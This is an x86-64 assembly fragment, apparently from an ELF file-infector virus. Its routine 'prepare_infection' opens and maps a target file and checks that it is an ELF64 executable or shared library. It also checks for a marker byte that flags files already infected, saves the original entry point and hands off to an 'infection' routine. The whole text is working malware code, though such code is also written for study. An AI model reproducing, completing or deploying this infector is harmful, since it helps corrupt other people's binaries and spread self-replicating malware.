prepare_infection:

	PUSH_ALL
	; celui la ici
	mov		rax, SYS_open
	lea		rdi, [rel path]
	mov		rsi, 2
	xor		rdx, rdx
	syscall
	mov     r12, rax


	cmp		rax, 0
	jle		.return
	mov		r12, rax


	lea		rdi, [rel stack]
	mov		rcx, 144
	xor		rax, rax
	rep		stosb

	; fstat(fd, &stat)
	mov     rdi, r12
	mov     rax, SYS_fstat



	lea     rsi, [stack]
	syscall
	cmp     rax, 0
	jl     .close_file_nomap

	; save file size
	mov     rax, [stack + 48]
	mov     [rel file_size], rax

	; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
	mov		rax, [rel file_size]

	mov     rax, SYS_mmap
	xor     rdi, rdi
	mov     rsi, [rel file_size]
	mov     rdx, PROT_READ | PROT_WRITE
	mov     r10, MAP_SHARED
	mov     r8, r12
	xor     r9, r9
	syscall
	cmp     rax, -4095
	jae     .close_file_nomap

	mov r14, rax

	; check is elf
	cmp dword [r14], 0x464c457f
	jne .close_file

	; check is elf64
	cmp byte [r14 + 0x4], 0x2
	jne .close_file

	; check infected
	cmp byte [r14 + 0xa], 0x0
	jne .close_file
	mov	BYTE [rel dynm], 0


	cmp	byte [r14 + 0x10], 0x02
	je	.continue_infection
	mov	BYTE [rel dynm], 1
	cmp	byte [r14 + 0x10], 0x03
	je	.continue_infection



	jmp	.close_file

	.continue_infection:

	mov		rax, [r14 + 0x18] ; e_entry
	mov		[old_entry], rax

	movzx	rcx, word [r14 + 0x38] ; e_phnum
	movzx	rdi, word [r14 + 0x36] ; e_phentisize
	xor		r11, r11
	NOP
	NOP
	NOP
	NOP
	xor		r10, r10
	NOP
	NOP
	NOP
	NOP

	call	infection

	.close_file:
		mov		rax, SYS_munmap
		mov		rdi, r14
		mov		rsi, [rel file_size]
		syscall
	.close_file_nomap:
		mov		rax, SYS_close
		mov		rdi, r12
		syscall
	.return:
		lea		rsi, [rel path]
		call	sub_val
		POP_ALL
		ret
